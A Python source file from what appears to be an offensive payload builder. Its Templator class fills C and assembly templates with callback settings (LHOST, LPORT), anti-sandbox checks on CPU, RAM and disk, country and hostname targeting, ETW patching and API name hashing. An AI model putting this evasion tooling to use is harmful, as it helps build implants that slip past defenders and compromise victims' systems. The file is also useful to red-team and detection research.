import os
import re
from .utils import hash_obj, hash_obj_null, get_LCID


TEMPLATE_DIR = "src/templates/"

class Templator:
    """Class to handle templating operations.
    This can be:
        - Replacing config values (LHOST, LPORT, etc)
        - Adding anti-sandbox checks (RAM, CPU, etc)
        - Adding evasions (ETW, AMSI, etc)
        - Replacing hashes (function, module, etc)

    All the files to sed are in src/*

    The pattern to replace is:
    %__<TAG>__%

    When reading bloc code from a template file, the pattern is:
    //__<TAG>__//
    <content>
    //__END__<TAG>__//
    """
    def __init__(self, working_dir="build/", verbose=False):
        self.working_dir = working_dir if working_dir.endswith("/") else working_dir + "/"
        self.templates_folder = TEMPLATE_DIR
        self.verbose = verbose
        self.pattern = re.compile(r"%__(.+?)__%", re.DOTALL)

    def is_valid_tag(self, tag):
        return self.pattern.match(tag)

    # Replace occurrences of a string in a file
    def sed_file(self, filepath, pattern, new):
        fullpath = os.path.join(self.working_dir, filepath)
        if not os.path.isfile(fullpath):
            raise FileNotFoundError(f"File '{fullpath}' not found.")
        # Open the file in read/write mode
        with open(fullpath, 'r+') as file:
            content = file.read().replace(pattern, new)  # Replace old with new
            file.seek(0)
            file.write(content)
            file.truncate()

    # Replace occurrences of a string in all files within a folder with specific extensions
    def sed_files(self, pattern, new, extension=(".nasm", ".c", ".h")):
        for root, _dirs, files in os.walk(self.working_dir):
            for filename in files:
                if filename.endswith(extension):
                    full = os.path.join(root, filename)
                    rel  = os.path.relpath(full, self.working_dir)  # <- relative to working_dir
                    self.sed_file(rel, pattern, new)


    # Get template content by tag from templates folder
    def get_template(self, template_name, *values_to_replace):
        ordered_values = list(values_to_replace)
        print(f"Looking for template '{template_name}' in recursive folder {self.templates_folder}") if self.verbose else None
        for file in os.listdir(self.templates_folder):
            with open(os.path.join(self.templates_folder, file), "r") as f:
                content = f.read()
                pattern = re.compile(rf"//__{template_name}__//(.*?)//__END__{template_name}__//", re.DOTALL)
                match = pattern.search(content)
                if match:
                    template_content = match.group(1).strip()
                    if ordered_values:
                        for i, value in enumerate(ordered_values):
                            template_content = template_content.replace(f"%__VALUE{i+1}__%", str(value))
                    return template_content
        raise ValueError(f"Template '{template_name}' not found in templates folder.")

    # Extract tags from a file
    def extract_tags_from_file(self, filepath, exceptions=[]):
        tags = []
        with open(filepath, 'r', encoding="utf-8") as file:
            content = file.read()
            matches = self.pattern.findall(content)

            for raw_tag in matches:
                parts = raw_tag.split("__")
                if len(parts) < 2:
                    tag_type = None
                    tag_name = parts[0]
                else:
                    tag_type = parts[0] or None
                    tag_name = parts[1]
                if raw_tag in exceptions or tag_name in exceptions:
                    continue
                tags.append({"type": tag_type, "name": tag_name, "replaced": False, "raw": f"%__{raw_tag}__%"})

        print(tags) if self.verbose else None
        return tags

    # Extract tags from all files within a folder recursively
    def extract_tags_from_folder(self, folderpath=None, exceptions=[]):
        if folderpath is None:
            folderpath = self.working_dir
        result = []
        for root, _dirs, files in os.walk(folderpath):
            if root.endswith("templates"):
                continue  # Skip templates folder
            for filename in files:
                if filename.endswith((".nasm", ".c", ".h")):
                    filepath = os.path.join(root, filename)
                    path_from_root = os.path.relpath(filepath, self.working_dir)
                    result.append({
                        "filepath": path_from_root,
                        "tags": self.extract_tags_from_file(filepath, exceptions=exceptions)
                    })
        return result
                
    def get_all_tags_from_folder(self, exception=[]):
        tags_by_file = self.extract_tags_from_folder(self.working_dir)
        if exception:
            for file in tags_by_file:
                file["tags"] = [tag for tag in file["tags"] if tag not in exception]
        return tags_by_file


    def replace_tags(self, tags_by_file):
        for file in tags_by_file:
            for tag in file["tags"]:
                template = self.get_template(tag)
                if template:
                    self.sed_files(tag, template)


    def process_tags(self, tags_by_file, config, args, exceptions=[]):
        not_replaced_tags = []
        for file in tags_by_file:
            filepath = file["filepath"]
            tags = file["tags"]
            for tag in tags:
                print(f"Processing tag: {tag['raw']} (type: {tag['type']}, name: {tag['name']})") if args.verbose else None
                if tag['replaced']:
                    continue
                elif tag['type'] == "MODHASH":
                    self.sed_file(filepath, tag['raw'], hash_obj(tag['name'], "", args.verbose))
                elif tag['type'] == "FCTHASH":
                    self.sed_file(filepath, tag['raw'], hash_obj(tag['name'], "function", args.verbose))

                elif tag['type'] == "SANDBOX":
                    if tag['name'] == "CPU_CHECK":
                        if config.getint("Anti-Analysis", "cpu_cores"):
                            check_content = self.get_template(tag['name'], str(config.getint("Anti-Analysis", "cpu_cores")))
                            self.sed_file(filepath, tag['raw'], check_content)
                        else:
                            print("No CPU core count for Sandbox detection set in config file. Skipping CPU check.") if args.verbose else None
                            self.sed_file(filepath, tag['raw'], '/* No CPU check configured */')

                    elif tag['name'] == "RAM_CHECK":
                        if config.getint("Anti-Analysis", "ram_size"):
                            check_content = self.get_template(tag['name'], str(config.getint("Anti-Analysis", "ram_size")))
                            self.sed_file(filepath, tag['raw'], check_content)
                        else:
                            print("No RAM size for Sandbox detection set in config file. Skipping RAM check.") if args.verbose else None
                            self.sed_file(filepath, tag['raw'], '/* No RAM check configured */')

                    elif tag['name'] == "DISK_CHECK":
                        if config.getint("Anti-Analysis", "disk_size"):
                            check_content = self.get_template(tag['name'], str(config.getint("Anti-Analysis", "disk_size")))
                            self.sed_file(filepath, tag['raw'], check_content)
                        else:
                            print("No Disk size for Sandbox detection set in config file. Skipping Disk check.") if args.verbose else None
                            self.sed_file(filepath, tag['raw'], '/* No Disk check configured */')

                    elif tag['name'] == "COUNTRY_CHECK":
                        if config.get("Anti-Analysis", "avoid_countries"):
                            check_content = self.get_template(tag['name'])
                            self.sed_file(filepath, tag['raw'], check_content)
                        else:
                            self.sed_file(filepath, tag['raw'], '// Country check not enabled')

                    elif tag['name'] == "AVOID_COUNTRIES":
                        if config.get("Anti-Analysis", "avoid_countries"):
                            countries = config.get("Anti-Analysis", "avoid_countries").split(",")
                            countries_lcid = [str(get_LCID(country.strip())) for country in countries if country.strip()]
                            self.sed_file(filepath, tag['raw'], "{" + ", ".join(countries_lcid) + "}")
                        else:
                            self.sed_file(filepath, tag['raw'], "/* No countries to avoid configured */")

                    elif tag['name'] == "AVOID_HOSTNAME":
                        if config.get("Anti-Analysis", "avoid_hostname"):
                            res = ""
                            for hostname in config.get("Anti-Analysis", "avoid_hostname").split(","):
                                hostname = hostname.strip()
                                if hostname:
                                    res += hash_obj("", hostname, args.verbose) + ","
                            self.sed_file(filepath, tag['raw'], res[:-1])
                        else:
                            self.sed_file(filepath, tag['raw'], "/* No hostnames to avoid configured */")

                    elif tag['name'] == "TARGET_HOSTNAME":
                        if config.get("Anti-Analysis", "target_hostname"):
                            hashed_hostname = hash_obj("", config.get("Anti-Analysis", "target_hostname"), args.verbose)
                            self.sed_file(filepath, tag['raw'], hashed_hostname)
                        else:
                            self.sed_file(filepath, tag['raw'], hash_obj_null())

                elif tag['type'] == "EVASION":
                    if tag['name'] == "ETW_PATCHING":
                        if args.etw:
                            self.sed_file(filepath, tag['raw'], "patch_etw();")
                        else:
                            self.sed_file(filepath, tag['raw'], "// ETW patching not enabled")

                elif not tag['type']:
                    if tag['name'] == "LHOST":
                        if config.get("Payload", "lhost"):
                            self.sed_file(filepath, tag['raw'], config.get("Payload", "lhost"))
                        else:
                            raise ValueError("LHOST is not set in the configuration (.conf) file.")
                    elif tag['name'] == "LPORT":
                        if config.get("Payload", "lport"):
                            self.sed_file(filepath, tag['raw'], config.get("Payload", "lport"))
                        else:
                            raise ValueError("LPORT is not set in the configuration (.conf) file.")
                else:
                    not_replaced_tags.append(tag)

        return not_replaced_tags